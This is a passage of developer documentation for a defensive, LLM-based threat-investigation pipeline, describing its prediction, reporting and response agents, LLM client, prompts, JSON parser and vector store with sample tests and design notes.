- Provides actionable threat intelligence
- Enables proactive countermeasures
- Supports incident response planning

**Internal Workflow:**
```
Techniques + Campaign → RAG Attack Chain Retrieval → LLM Prediction → Parse Response → Return Prediction
```

**Dependencies:**
- **Imports:** `typing`, `rag.attack_chain_retriever`, `llm.groq_client`, `llm.prompts`, `llm.output_parsers`
- **Imported by:** `graph.nodes`
- **Calls:** `retrieve_likely_next_techniques()`, `invoke_llm()`, `extract_json()`

**Classes:**

#### `PredictionAgent`
- **Purpose:** Predict attacker next steps
- **Logic:** Retrieves attack chain context, uses LLM for prediction

**Methods:**

#### `run(self, techniques: List[Dict], campaign: Dict) -> Dict`
- **Input:** Techniques and campaign
- **Output:** Prediction dictionary
- **Purpose:** Predict likely next techniques
- **Logic:**
  1. Log incoming counts
  2. Return empty prediction if no techniques
  3. Extract technique names
  4. Retrieve likely next techniques via RAG
  5. Construct prompt with techniques, campaign, and RAG context
  6. Call LLM with PREDICTION_SYSTEM_PROMPT
  7. Parse JSON response
  8. If parsing fails, return fallback prediction
  9. Return prediction
- **Why:** RAG provides attack chain context, LLM performs prediction
- **LLM Prompt:** PREDICTION_SYSTEM_PROMPT
- **Fallback:** Returns empty techniques with rationale about parsing failure

**Example:**
```python
agent = PredictionAgent()
techniques = [{"name": "PowerShell", "technique_id": "T1059.001"}]
campaign = {"name": "C2 Activity"}
prediction = agent.run(techniques, campaign)
# Returns:
{
    "likely_next_techniques": [
        {"technique_id": "T1083", "name": "File and Directory Discovery", "confidence": 0.85}
    ],
    "rationale": "After PowerShell execution, attackers typically perform reconnaissance"
}
```

**Testing:**

**Unit Tests:**
```python
def test_prediction_agent_empty():
    agent = PredictionAgent()
    result = agent.run([], {})
    assert result["likely_next_techniques"] == []
    assert "rationale" in result

def test_prediction_agent_prediction():
    agent = PredictionAgent()
    techniques = [{"name": "PowerShell", "technique_id": "T1059.001"}]
    result = agent.run(techniques, {})
    assert "likely_next_techniques" in result
    assert "rationale" in result

def test_prediction_agent_fallback():
    agent = PredictionAgent()
    # Mock LLM to fail parsing
    result = agent.run([{"name": "PowerShell"}], {})
    assert "could not be parsed" in result["rationale"]
```

**Manual Tests:**
```python
from agents.prediction_agent import PredictionAgent

agent = PredictionAgent()
techniques = [{"name": "PowerShell", "technique_id": "T1059.001"}]
campaign = {"name": "C2 Activity"}
prediction = agent.run(techniques, campaign)
print(f"Predicted {len(prediction['likely_next_techniques'])} next techniques")
print(f"Rationale: {prediction['rationale']}")
```

**Expected Outputs:**
- Likely next techniques with confidence scores
- Rationale for predictions
- Technique IDs and names

**Failure Cases:**
- RAG retrieval fails
- LLM API failure
- JSON parsing failure
- No techniques provided

**Edge Cases:**
- Techniques with no clear next steps
- LLM returns invalid technique IDs
- Empty campaign context
- Unknown techniques

**Interview Questions:**

**Q: Why use RAG for attack chain retrieval instead of hard-coded chains?**
**A:** Flexibility. Hard-coded chains require manual maintenance. RAG retrieves relevant attack chain context dynamically, handling new techniques and variations without code changes.

**Q: What happens if no techniques are provided?**
**A:** The agent returns an empty prediction with a rationale that no techniques were observed yet. This is appropriate since prediction requires some observed behavior.

**Q: How accurate are these predictions?**
**A:** Predictions are based on statistical patterns in MITRE ATT&CK data and LLM analysis. They're probabilistic, not deterministic. They should be used as guidance, not certainty. Confidence scores indicate prediction reliability.

**Design Decisions:**

**Chosen Solution:** RAG attack chains + LLM prediction
**Alternatives:**
- Hard-coded attack chains: Simple, inflexible
- Statistical prediction: Data-driven, requires training data
- Pure LLM prediction: No context, hallucination risk
- Machine learning model: Requires training, complex

**Advantages:**
- Dynamic attack chain retrieval
- LLM intelligence for prediction
- Confidence scores for reliability
- No training data required

**Disadvantages:**
- LLM API costs
- Dependent on ATT&CK data quality
- Predictions are probabilistic
- May miss novel attack patterns

**Weak Points:**
- No prediction accuracy metrics
- No learning from past predictions
- No context about attacker skill level
- No environmental context (defenses)
- No temporal weighting

**Improvements:**
- Add prediction accuracy tracking
- Implement feedback learning from actual next steps
- Add attacker skill level assessment
- Add environmental context (defenses, controls)
- Add temporal weighting (recent techniques weighted higher)
- Add prediction confidence calibration

---

### agents/reporting_agent.py

**Purpose:**
- Generate comprehensive markdown intelligence reports
- Synthesize all investigation results into human-readable format
- Provide executive summaries and technical details
- Support analyst decision-making

**Why it exists:**
- Investigation results need human-readable presentation
- Markdown is widely supported and readable
- Reports provide audit trail and documentation
- Supports incident response and communication

**Problem it solves:**
- Presents complex investigation results clearly
- Provides actionable intelligence to analysts
- Documents investigation findings
- Enables communication with stakeholders

**Internal Workflow:**
```
Full State → Construct Prompt → LLM Report Generation → Save Report → Return Markdown
```

**Dependencies:**
- **Imports:** `graph.state`, `llm.groq_client`, `llm.prompts`, `reports.report_generator`
- **Imported by:** `graph.nodes`
- **Calls:** `invoke_llm()`, `save_report()`

**Classes:**

#### `ReportingAgent`
- **Purpose:** Generate intelligence reports
- **Logic:** Synthesizes state into markdown report

**Methods:**

#### `run(self, state: InvestigationState) -> str`
- **Input:** Full investigation state
- **Output:** Markdown report string
- **Purpose:** Generate intelligence report
- **Logic:**
  1. Construct prompt with all state components:
     - Events
     - IOCs
     - Vulnerabilities
     - Techniques
     - Campaign
     - Prediction
  2. Call LLM with REPORTING_SYSTEM_PROMPT
  3. Save report to file (via report_generator)
  4. Return markdown report
- **Why:** LLM synthesizes complex data into readable report
- **LLM Prompt:** REPORTING_SYSTEM_PROMPT
- **Output:** Markdown-formatted report

**Example:**
```python
agent = ReportingAgent()
state = {
    "events": [...],
    "iocs": [...],
    "techniques": [...],
    "campaign": {...},
    "prediction": {...}
}
report = agent.run(state)
# Returns markdown report with sections:
# - Executive Summary
# - Timeline
# - IOC Analysis
# - ATT&CK Mapping
# - Vulnerability Analysis
# - Campaign Narrative
# - Threat Prediction
# - Recommendations
```

**Testing:**

**Unit Tests:**
```python
def test_reporting_agent_empty_state():
    agent = ReportingAgent()
    state = new_investigation_state([])
    report = agent.run(state)
    assert isinstance(report, str)
    assert len(report) > 0

def test_reporting_agent_structure():
    agent = ReportingAgent()
    state = new_investigation_state([])
    state["campaign"] = {"name": "Test Campaign"}
    report = agent.run(state)
    assert "Test Campaign" in report or "campaign" in report.lower()
```

**Manual Tests:**
```python
from agents.reporting_agent import ReportingAgent
from graph.state import new_investigation_state

agent = ReportingAgent()
state = new_investigation_state([{"test": "event"}])
report = agent.run(state)
print(report)
```

**Expected Outputs:**
- Markdown-formatted report
- Executive summary
- Technical details
- Recommendations

**Failure Cases:**
- LLM API failure
- Report save failure
- Invalid state structure

**Edge Cases:**
- Empty state (no events)
- Partial state (some agents failed)
- Very large state (token limits)

**Interview Questions:**

**Q: Why use LLM for report generation instead of templates?**
**A:** Flexibility and intelligence. Templates are rigid and require manual updates. LLM can adapt report content to the investigation findings, emphasize relevant information, and provide contextual analysis.

**Q: What happens if the LLM report generation fails?**
**A:** Currently, the exception propagates and the investigation fails. An improvement would be to have a fallback template-based report generation to ensure reports are always produced.

**Q: Why save reports to disk in addition to returning them?**
**A:** Audit trail and persistence. Saved reports provide historical documentation, enable offline review, and support compliance requirements. The API can return the report while the file provides persistence.

**Design Decisions:**

**Chosen Solution:** LLM report generation
**Alternatives:**
- Template-based reports: Faster, less flexible
- Hybrid: Template structure with LLM content
- Multiple report formats: PDF, HTML, JSON
- No report generation: Return raw state

**Advantages:**
- Flexible and adaptive
- Contextual analysis
- No template maintenance
- Human-readable output

**Disadvantages:**
- LLM API costs
- Less predictable structure
- Dependent on LLM quality
- No formatting control

**Weak Points:**
- No report template consistency
- No report validation
- No multiple format support
- No report customization
- No report versioning

**Improvements:**
- Add template-based structure with LLM content
- Add report validation (required sections)
- Add multiple output formats (PDF, HTML)
- Add report customization options
- Add report versioning and diffing
- Add report quality metrics

---

### agents/response_agent.py

**Purpose:**
- Generate automated response actions
- Execute actions via external connectors
- Apply security policy to action decisions
- Log all actions for audit trail

**Why it exists:**
- Automated response reduces incident response time
- Policy engine ensures safe automation
- Connectors integrate with security infrastructure
- Audit trail provides accountability

**Problem it solves:**
- Automates incident response actions
- Ensures policy compliance
- Integrates with security tools
- Provides action auditability

**Internal Workflow:**
```
Campaign + Techniques + IOCs → LLM Action Generation → Policy Evaluation → Action Execution → Audit Logging → Return Results
```

**Dependencies:**
- **Imports:** `logging`, `typing`, `llm.groq_client`, `llm.prompts`, `llm.output_parsers`, `actions.policy`, `actions.connectors`, `actions.audit_log`, `actions.action_models`
- **Imported by:** `graph.nodes`
- **Calls:** `invoke_llm()`, `extract_json()`, `evaluate()`, `ACTION_DISPATCH`, `log_action()`

**Classes:**

#### `ResponseAgent`
- **Purpose:** Generate and execute response actions
- **Logic:** Generates actions, evaluates policy, executes via connectors

**Methods:**

#### `run(self, campaign: Dict, techniques: List[Dict], iocs: List[Dict]) -> List[Dict]`
- **Input:** Campaign, techniques, IOCs
- **Output:** List of action results
- **Purpose:** Generate and execute response actions
- **Logic:**
  1. Log incoming data
  2. Return empty list if no campaign
  3. Construct prompt with campaign, techniques, IOCs
  4. Call LLM with RESPONSE_SYSTEM_PROMPT
  5. Parse JSON response into ProposedAction objects
  6. If parsing fails, generate fallback actions from IOCs
  7. For each action:
     - Evaluate policy (auto_execute, pending_approval, denied)
     - If auto_execute: call connector function
     - Log action execution result
     - Save to audit log
  8. Return action results
- **Why:** LLM generates intelligent actions, policy ensures safety
- **LLM Prompt:** RESPONSE_SYSTEM_PROMPT
- **Fallback:** Generates IOC-based actions (block IP, isolate host)
- **Policy:** Confidence thresholds, protected targets, rate limiting

**Example:**
```python
agent = ResponseAgent()
campaign = {"name": "Malware Infection"}
techniques = [{"technique_id": "T1059.001"}]
iocs = [{"value": "185.220.101.45", "ioc_type": "ip"}]
actions = agent.run(campaign, techniques, iocs)
# Returns:
[
    {
        "action": {"action_type": "block_ip", "target": "185.220.101.45"},
        "status": "auto_execute",
        "detail": "IP blocked successfully"
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_response_agent_empty_campaign():
    agent = ResponseAgent()
    result = agent.run({}, [], [])
    assert result == []

def test_response_agent_fallback():
    agent = ResponseAgent()
    # Mock LLM to fail
    result = agent.run({"name": "Test"}, [], [{"value": "1.2.3.4", "ioc_type": "ip"}])
   assert len(result) > 0  # Fallback actions generated

def test_response_agent_policy():
    agent = ResponseAgent()
    # Test with protected target
    result = agent.run({"name": "Test"}, [], [{"value": "DC-FILESRV01", "ioc_type": "host"}])
    assert any(a["status"] == "denied" for a in result)
```

**Manual Tests:**
```python
from agents.response_agent import ResponseAgent

agent = ResponseAgent()
campaign = {"name": "Test Campaign"}
techniques = [{"technique_id": "T1059.001"}]
iocs = [{"value": "185.220.101.45", "ioc_type": "ip"}]
actions = agent.run(campaign, techniques, iocs)
for action in actions:
    print(f"{action['status']}: {action['action']['action_type']} -> {action['action']['target']}")
```

**Expected Outputs:**
- Action results with status
- Execution details
- Audit log entries

**Failure Cases:**
- LLM API failure
- Policy evaluation failure
- Connector execution failure
- Audit log failure

**Edge Cases:**
- No IOCs for fallback
- All actions denied by policy
- Connector API failures
- DRY_RUN mode

**Interview Questions:**

**Q: Why have both LLM action generation and fallback?**
**A:** Reliability. LLM may fail due to rate limits or parsing errors. Fallback ensures actions are still generated based on IOCs, providing baseline automation even when LLM fails.

**Q: How does the policy engine prevent dangerous actions?**
**A:** Multiple safeguards: protected targets list (critical systems), confidence thresholds (0.70 minimum), rate limiting (3 actions per target per hour), and global kill switch (AUTO_RESPONSE_ENABLED).

**Q: What happens if a connector execution fails?**
**A:** The failure is logged in the action detail, but the investigation continues. Other actions are still attempted. The audit log captures both successes and failures for accountability.

**Design Decisions:**

**Chosen Solution:** LLM generation + policy engine + connectors
**Alternatives:**
- Rule-based actions: Predictable, less intelligent
- Pure LLM actions: No policy control
- Manual approval only: No automation
- Hybrid with playbook: More structured

**Advantages:**
- Intelligent action generation
- Policy-based safety
- Multiple connector support
- Comprehensive audit trail

**Disadvantages:**
- Complex implementation
- LLM API costs
- Connector dependencies
- Policy tuning required

**Weak Points:**
- No action prioritization
- No action dependency management
- No action rollback
- No action impact assessment
- No action testing before execution

**Improvements:**
- Add action prioritization logic
- Implement action dependencies (execute in order)
- Add action rollback capabilities
- Add action impact assessment
- Add action testing/simulation mode
- Add action approval workflow integration

---

## LLM Integration

### llm/groq_client.py

**Purpose:**
- Wrapper for Groq LLM API integration
- Provides simplified interface for LLM invocation
- Manages LLM client configuration

**Why it exists:**
- Centralizes LLM API interaction
- Provides consistent interface across all agents
- Abstracts LangChain complexity
- Enables easy LLM provider switching

**Problem it solves:**
- Simplifies LLM API calls
- Provides single place for LLM configuration
- Reduces boilerplate in agents
- Enables LLM provider abstraction

**Internal Workflow:**
```
Config → LLM Client Initialization → invoke_llm() → API Call → Response
```

**Dependencies:**
- **Imports:** `langchain_groq.ChatGroq`, `config`
- **Imported by:** All agents
- **Calls:** None (LLM integration leaf node)

**Global Variables:**

#### `llm`
- **Type:** `ChatGroq` instance
- **Purpose:** LangChain LLM client for Groq API
- **Configuration:**
  - `api_key`: From config.GROQ_API_KEY
  - `model`: From config.GROQ_MODEL (default: llama-3.3-70b-versatile)
  - `temperature`: From config.GROQ_TEMPERATURE (default: 0.1)
- **Why:** Global singleton for reuse across all agents

**Functions:**

#### `invoke_llm(system_prompt: str, user_prompt: str) -> str`
- **Input:** System prompt string, user prompt string
- **Output:** LLM response string
- **Purpose:** Convenience wrapper for single-turn LLM call
- **Logic:**
  1. Construct messages array with system and human roles
  2. Call llm.invoke(messages)
  3. Return response.content
- **Why:** Simplifies common pattern of system+user prompts
- **Message Format:** LangChain message format (role, content)

**Example:**
```python
response = invoke_llm(
    system_prompt="You are a security analyst.",
    user_prompt="Analyze this event: powershell.exe -enc ..."
)
# Returns: LLM response string
```

**Testing:**

**Unit Tests:**
```python
def test_invoke_llm():
    response = invoke_llm("Test", "Test")
    assert isinstance(response, str)
    assert len(response) > 0

def test_invoke_llm_with_config():
    # Test with different model/temperature
    original_model = config.GROQ_MODEL
    config.GROQ_MODEL = "llama-3.1-8b"
    response = invoke_llm("Test", "Test")
    assert isinstance(response, str)
    config.GROQ_MODEL = original_model
```

**Manual Tests:**
```python
from llm.groq_client import invoke_llm

response = invoke_llm(
    "You are a helpful assistant.",
    "What is 2+2?"
)
print(response)
```

**Expected Outputs:**
- LLM response string
- Text content only (no metadata)

**Failure Cases:**
- Invalid API key
- Rate limiting (429 errors)
- Network failure
- Invalid model name

**Edge Cases:**
- Empty prompts
- Very long prompts (token limits)
- Special characters in prompts
- Unicode characters

**Interview Questions:**

**Q: Why use LangChain instead of direct Groq API calls?**
**A:** LangChain provides abstraction, message formatting, and future flexibility. If we need to switch LLM providers, we only change the client initialization. LangChain also provides retry logic, streaming, and other features out of the box.

**Q: Why use a global llm instance instead of creating new instances?**
**A:** Efficiency. Reusing the same client connection reduces overhead. LangChain clients are thread-safe for concurrent requests. Global instance also ensures consistent configuration across all calls.

**Q: What happens if the Groq API rate limit is reached?**
**A:** LangChain's default retry logic handles 429 errors. However, for production, you'd want to implement exponential backoff and queueing. The current implementation may fail under heavy load.

**Design Decisions:**

**Chosen Solution:** LangChain ChatGroq with global instance
**Alternatives:**
- Direct Groq API calls: More control, more boilerplate
- OpenAI SDK: Different provider, similar interface
- Custom HTTP client: Maximum control, more work
- Multiple LLM providers: Redundancy, complexity

**Advantages:**
- LangChain abstraction
- Easy provider switching
- Built-in retry logic
- Message format handling
- Streaming support (if needed)

**Disadvantages:**
- Additional dependency
- LangChain overhead
- Less control over API calls
- Potential version conflicts

**Weak Points:**
- No custom retry logic
- No rate limiting handling
- No request queuing
- No cost tracking
- No response caching

**Improvements:**
- Add custom retry with exponential backoff
- Implement request queuing for high load
- Add rate limiting per endpoint
- Add cost tracking and budgeting
- Add response caching for common prompts
- Add fallback LLM providers

---

### llm/prompts.py

**Purpose:**
- Centralized storage of all LLM system prompts
- Provides consistent prompting across agents
- Enables prompt versioning and A/B testing

**Why it exists:**
- Prompts are critical to LLM performance
- Centralized management enables easy updates
- Consistency across investigations
- Prompt engineering iteration

**Problem it solves:**
- Provides single source of truth for prompts
- Enables prompt versioning
- Facilitates prompt testing
- Reduces prompt duplication

**Internal Workflow:**
```
Prompt Constants → Agent Import → LLM Invocation
```

**Dependencies:**
- **Imports:** None (constants file)
- **Imported by:** All agents
- **Calls:** None (constants file)

**Constants:**

#### `COLLECTION_SYSTEM_PROMPT`
- **Purpose:** System prompt for event normalization
- **Content:** Instructions for converting heterogeneous logs to standard schema
- **Key Instructions:**
  - Preserve all evidence
  - Normalize specific fields (timestamp, host, process, network, etc.)
  - Never invent missing values
  - Preserve software inventory fields (product, version, vendor)
  - Return JSON array only
- **Why:** Ensures consistent normalization across all telemetry sources

#### `ENRICHMENT_SYSTEM_PROMPT`
- **Purpose:** System prompt for IOC enrichment
- **Content:** Instructions for identifying and scoring IOCs
- **Key Instructions:**
  - Identify all IOC types (IP, domain, hash, etc.)
  - Distinguish process names from domains
  - Assign verdict (benign/suspicious/malicious/unknown)
  - Assign confidence (0.0-1.0)
  - Provide justification
  - Never invent threat intelligence
- **Why:** Ensures consistent IOC scoring and classification

#### `VULNERABILITY_SYSTEM_PROMPT`
- **Purpose:** System prompt for CVE analysis
- **Content:** Instructions for identifying relevant CVEs
- **Key Instructions:**
  - Analyze software context and retrieved CVEs
  - Assign confidence based on software/version match
  - Include CVSS scores and severity
  - Provide justification for relevance
  - Only include CVEs with confidence ≥ 0.50
- **Why:** Ensures consistent CVE relevance assessment

#### `ATTACK_MAPPING_SYSTEM_PROMPT`
- **Purpose:** System prompt for ATT&CK technique mapping
- **Content:** Instructions for mapping events to techniques
- **Key Instructions:**
  - Identify single best technique
  - Use evidence-based confidence scoring
  - Confidence scale: 0.95-1.00 (multiple sources), 0.80-0.94 (strong), 0.60-0.79 (moderate), 0.30-0.59 (weak), 0.00-0.29 (insufficient)
  - Return null technique if no match
  - Never inflate confidence
- **Why:** Ensures consistent technique mapping with calibrated confidence

#### `CORRELATION_SYSTEM_PROMPT`
- **Purpose:** System prompt for campaign correlation
- **Content:** Instructions for correlating events into campaigns
- **Key Instructions:**
  - Correlate using multiple factors (time, user, host, IOCs, techniques)
  - Build chronological timeline
  - Assign campaign confidence
  - State if events are unrelated
- **Why:** Ensures consistent campaign identification

#### `PREDICTION_SYSTEM_PROMPT`
- **Purpose:** System prompt for threat prediction
- **Content:** Instructions for predicting attacker next steps
- **Key Instructions:**
  - Follow realistic ATT&CK attack chains
  - Consider MITRE ATT&CK tactics (Initial Access, Execution, etc.)
  - Provide technique_id and confidence
  - Include rationale
- **Why:** Ensures realistic and actionable predictions

#### `REPORTING_SYSTEM_PROMPT`
- **Purpose:** System prompt for report generation
- **Content:** Instructions for generating intelligence reports
- **Key Instructions:**
  - Use Markdown format
  - Include 12 specific sections (Executive Summary, Timeline, etc.)
  - Be concise (under 500 words)
  - Use tables where appropriate
  - Do not invent evidence
  - State "No vulnerabilities identified" if none found
- **Why:** Ensures consistent report structure and quality

#### `RESPONSE_SYSTEM_PROMPT`
- **Purpose:** System prompt for response action generation
- **Content:** Instructions for recommending response actions
- **Key Instructions:**
  - Recommend appropriate actions (block_ip, isolate_host, etc.)
  - Include priority, severity, confidence, rationale
  - Be conservative with disruptive actions
  - Only recommend disruptive actions when confidence ≥ 0.90
  - Always include notify_analyst action
- **Why:** Ensures safe and appropriate action recommendations

**Testing:**

**Unit Tests:**
```python
def test_prompt_constants_exist():
    assert COLLECTION_SYSTEM_PROMPT
    assert ENRICHMENT_SYSTEM_PROMPT
    assert VULNERABILITY_SYSTEM_PROMPT
    assert len(COLLECTION_SYSTEM_PROMPT) > 100

def test_prompt_content():
    assert "JSON array" in COLLECTION_SYSTEM_PROMPT
    assert "verdict" in ENRICHMENT_SYSTEM_PROMPT
    assert "CVE" in VULNERABILITY_SYSTEM_PROMPT
```

**Manual Tests:**
```python
from llm.prompts import COLLECTION_SYSTEM_PROMPT

print(COLLECTION_SYSTEM_PROMPT)
# Verify prompt structure and content
```

**Expected Outputs:**
- All prompts are non-empty strings
- Prompts contain expected keywords
- Prompts follow consistent structure

**Failure Cases:**
- Missing prompt constants
- Prompt syntax errors
- Prompt too long (token limits)

**Edge Cases:**
- Prompt injection attempts
- Special characters in prompts
- Unicode characters

**Interview Questions:**

**Q: Why store prompts as constants instead of in files?**
**A:** Simplicity for current scale. Constants are easy to version control and modify. For larger prompt libraries, files or a prompt management system would be better. Current approach is sufficient for 8 prompts.

**Q: How do you handle prompt versioning?**
**A:** Currently, prompts are versioned via git. For production, you'd want a prompt management system with versioning, A/B testing, and rollback capabilities. The current approach is manual but functional.

**Q: Why specify "Return ONLY JSON" in prompts?**
**A:** LLMs often include explanations or markdown. Specifying JSON-only output simplifies parsing and reduces errors. The output parser handles cases where LLM ignores this instruction.

**Design Decisions:**

**Chosen Solution:** Python constants in single file
**Alternatives:**
- Prompt files (JSON/YAML): External management
- Prompt management system: Versioning, A/B testing
- Database storage: Dynamic prompts
- Environment variables: Deployment flexibility

**Advantages:**
- Simple and accessible
- Version control friendly
- Easy to modify
- No external dependencies
- Fast access (no file I/O)

**Disadvantages:**
- No versioning built-in
- No A/B testing
- No prompt analytics
- Hard to manage many prompts
- No prompt templates

**Weak Points:**
- No prompt versioning
- No prompt testing framework
- No prompt analytics
- No prompt templates
- No prompt validation

**Improvements:**
- Add prompt versioning (e.g., PROMPT_V1, PROMPT_V2)
- Implement prompt A/B testing framework
- Add prompt performance analytics
- Use prompt templates for dynamic content
- Add prompt validation (length, keywords)
- Add prompt management system for scale

---

### llm/output_parsers.py

**Purpose:**
- Parse JSON from LLM responses
- Handle common LLM output formatting issues
- Provide robust JSON extraction

**Why it exists:**
- LLMs often wrap JSON in markdown code blocks
- LLMs may include explanations before/after JSON
- Need robust parsing to handle various formats
- Centralized parsing logic reduces duplication

**Problem it solves:**
- Extracts JSON from LLM responses despite formatting variations
- Handles markdown code blocks
- Handles partial JSON
- Provides consistent error handling

**Internal Workflow:**
```
LLM Response → Strip Markdown → Try JSON Parse → Fallback to Regex → Return JSON or Raise Error
```

**Dependencies:**
- **Imports:** `json`, `re`, `typing`
- **Imported by:** All agents
- **Calls:** None (utility function)

**Functions:**

#### `extract_json(text: str) -> Any`
- **Input:** LLM response text string
- **Output:** Parsed JSON object or array
- **Purpose:** Extract and parse JSON from LLM output
- **Logic:**
  1. Strip whitespace from text
  2. Try to extract JSON from markdown code blocks (```json ... ```)
  3. If found, parse the extracted content
  4. If parsing fails, try to find first {...} or [...] block with regex
  5. Parse the matched block
  6. If all attempts fail, raise ValueError
- **Why:** Handles multiple LLM output formats gracefully
- **Error Handling:** Raises ValueError with first 300 chars of text on failure

**Example:**
```python
# LLM returns:
# Here's the analysis:
# ```json
# {"result": "success"}
# ```
# Thanks for asking.

json_obj = extract_json(llm_response)
# Returns: {"result": "success"}
```

**Testing:**

**Unit Tests:**
```python
def test_extract_json_clean():
    result = extract_json('{"key": "value"}')
    assert result == {"key": "value"}

def test_extract_json_markdown():
    result = extract_json('```json\n{"key": "value"}\n```')
    assert result == {"key": "value"}

def test_extract_json_with_explanation():
    result = extract_json('Here is the result: {"key": "value"}')
    assert result == {"key": "value"}

def test_extract_json_invalid():
    with pytest.raises(ValueError):
        extract_json('not json at all')
```

**Manual Tests:**
```python
from llm.output_parsers import extract_json

# Test various formats
test_cases = [
    '{"key": "value"}',
    '```json\n{"key": "value"}\n```',
    'Text before {"key": "value"} text after',
    '[{"key": "value"}]'
]

for case in test_cases:
    result = extract_json(case)
    print(f"Parsed: {result}")
```

**Expected Outputs:**
- Parsed JSON object or array
- Handles markdown code blocks
- Handles text before/after JSON

**Failure Cases:**
- No JSON in text
- Invalid JSON syntax
- Multiple JSON blocks (returns first)

**Edge Cases:**
- Empty string
- Malformed JSON
- Nested JSON
- Unicode in JSON

**Interview Questions:**

**Q: Why handle markdown code blocks instead of requiring clean JSON?**
**A:** LLMs often include explanations or format responses with markdown. Handling these variations makes the system more robust and reduces prompt engineering complexity.

**Q: What happens if there are multiple JSON blocks in the response?**
**A:** The regex returns the first match. This is a known limitation. An improvement would be to validate all matches or use a more sophisticated parser. For current use cases, first match is sufficient.

**Q: Why raise ValueError instead of returning None on failure?**
**A:** Explicit error handling forces agents to handle parsing failures. Returning None could lead to silent failures. Raising an exception makes failures visible and requires explicit handling.

**Design Decisions:**

**Chosen Solution:** Regex-based extraction with fallback
**Alternatives:**
- Strict JSON parsing: Requires clean LLM output
- JSON Schema validation: More structured, more complex
- Custom parser: More control, more maintenance
- LLM post-processing: Ask LLM to fix its own output

**Advantages:**
- Handles multiple formats
- Simple implementation
- No external dependencies
- Fast execution
- Clear error messages

**Disadvantages:**
- Regex can be fragile
- No JSON schema validation
- First-match limitation
- No handling of malformed JSON
- No context about which JSON to extract

**Weak Points:**
- No JSON schema validation
- No handling of partial JSON
- No context-aware extraction
- No recovery from malformed JSON
- No support for JSON streaming

**Improvements:**
- Add JSON schema validation
- Implement context-aware extraction (find JSON after specific keywords)
- Add partial JSON recovery
- Support JSON streaming for large responses
- Add LLM fallback (ask LLM to fix output)
- Add JSON linting and validation

---

## RAG Implementation

### rag/vector_store.py

**Purpose:**
- Manage ChromaDB connection and collections
- Provide add/query operations for vector similarity search
- Support both ATT&CK and CVE collections

**Why it exists:**
- ChromaDB provides persistent vector storage
- Centralizes database operations
- Enables semantic search for techniques and CVEs
- Supports offline operation (no external embedding API)

**Problem it solves:**
- Provides persistent vector storage
- Enables semantic similarity search
- Manages multiple collections (ATT&CK, CVE)
- Abstracts ChromaDB complexity

**Internal Workflow:**
```
Client Initialization → Collection Access → Embedding Generation → Vector Operations
```

**Dependencies:**
- **Imports:** `chromadb`, `config`, `rag.embeddings`
- **Imported by:** All RAG modules, agents
- **Calls:** `embed_texts()`

**Global Variables:**

#### `_client`
- **Type:** ChromaDB client (singleton)
- **Purpose:** Reusable ChromaDB client connection
- **Why:** Avoids repeated connection overhead

**Functions:**

#### `get_client()`
- **Input:** None
- **Output:** ChromaDB PersistentClient
- **Purpose:** Get or create ChromaDB client
- **Logic:**
  1. Check if global _client exists
  2. If not, create new PersistentClient with settings
  3. Disable telemetry for privacy
  4. Return client
- **Why:** Singleton pattern for connection reuse
- **Settings:** `anonymized_telemetry=False`, `allow_reset=True`

#### `get_attack_collection()`
- **Input:** None
- **Output:** ChromaDB collection
- **Purpose:** Get or create ATT&CK techniques collection
- **Logic:** Get client, return get_or_create_collection with attack collection name
- **Why:** Centralized collection access

#### `get_cve_collection()`
- **Input:** None
- **Output:** ChromaDB collection
- **Purpose:** Get or create CVE database collection
- **Logic:** Get client, return get_or_create_collection with "cve_database" name
- **Why:** Centralized collection access

#### `add_chunks(chunks: list[dict], collection_name: str)`
- **Input:** List of {text, metadata} dicts, collection name
- **Output:** None
- **Purpose:** Add text chunks with embeddings to collection
- **Logic:**
  1. Return if no chunks
  2. Get appropriate collection based on name
  3. Extract texts and metadatas
  4. Generate IDs based on collection type (technique_id or cve_id)
  5. Generate embeddings for texts
  6. Upsert to collection
- **Why:** Batch insertion with automatic embedding
- **ID Generation:** `{technique_id}-{index}` or `{cve_id}-{index}`

#### `query_similar(query_text: str, n_results: int, collection_name: str)`
- **Input:** Query text, number of results, collection name
- **Output:** ChromaDB query results
- **Purpose:** Perform vector similarity search
- **Logic:**
  1. Get appropriate collection
  2. Generate embedding for query text
  3. Query collection with embedding
  4. Return results
- **Why:** Semantic search for relevant documents

**Testing:**

**Unit Tests:**
```python
def test_get_client():
    client = get_client()
    assert client is not None

def test_get_attack_collection():
    collection = get_attack_collection()
    assert collection.name == config.CHROMA_COLLECTION_ATTACK

def test_add_chunks():
    chunks = [{"text": "test", "metadata": {"technique_id": "T1234"}}]
    add_chunks(chunks)
    # Verify insertion

def test_query_similar():
    results = query_similar("powershell execution", n_results=3)
    assert "documents" in results
```

**Manual Tests:**
```python
from rag.vector_store import get_client, query_similar

client = get_client()
print(f"Client: {client}")

results = query_similar("malicious process", n_results=3)
print(f"Results: {results}")
```

**Expected Outputs:**
- Valid ChromaDB client
- Collection objects
- Query results with documents, metadatas, distances

**Failure Cases:**
- ChromaDB connection failure
- Invalid collection name
- Embedding generation failure
- Query with invalid text

**Edge Cases:**
- Empty chunks list
- Very long query text
- Collection doesn't exist (auto-created)
- No results found

**Interview Questions:**

**Q: Why use PersistentClient instead of ephemeral client?**
**A:** Persistence. PersistentClient stores data on disk, surviving restarts. Ephemeral client stores in memory only. For threat intelligence, we need persistent storage for ATT&CK and CVE data.

**Q: Why disable ChromaDB telemetry?**
**A:** Privacy and to avoid the PostHog error. ChromaDB's telemetry sends usage data to PostHog. Disabling it keeps the system self-contained and avoids external dependencies.

**Q: Why use upsert instead of insert?**
**A:** Idempotency. Upsert updates existing documents or inserts new ones. This allows re-running ingestion scripts without creating duplicates. It's safer for data loading operations.

**Design Decisions:**

**Chosen Solution:** ChromaDB PersistentClient with singleton
**Alternatives:**
- Ephemeral client: In-memory only, no persistence
- Qdrant: More features, more complex
- Pinecone: Cloud-only, external dependency
- FAISS: Pure Python, no persistence

**Advantages:**
- Persistent storage
- Local deployment
- Simple API
- Good performance
- No external dependencies

**Disadvantages:**
- Limited to local storage
- No built-in replication
- No distributed queries
- File-based storage limits

**Weak Points:**
- No backup mechanism
- No migration support
- No collection versioning
- No query optimization
- No sharding for large datasets

**Improvements:**
- Add automated backups
- Implement collection versioning
- Add query caching
- Implement collection migration
- Add monitoring and metrics
- Add sharding for large datasets

---

### rag/embeddings.py

**Purpose:**
- Generate text embeddings using sentence-transformers
- Provide local embedding generation (no external API)
- Support offline operation

**Why it exists:**
- Embeddings required for vector similarity search
- Local model avoids external API dependencies
- Sentence-transformers provides high-quality embeddings
- Offline capability for air-gapped environments

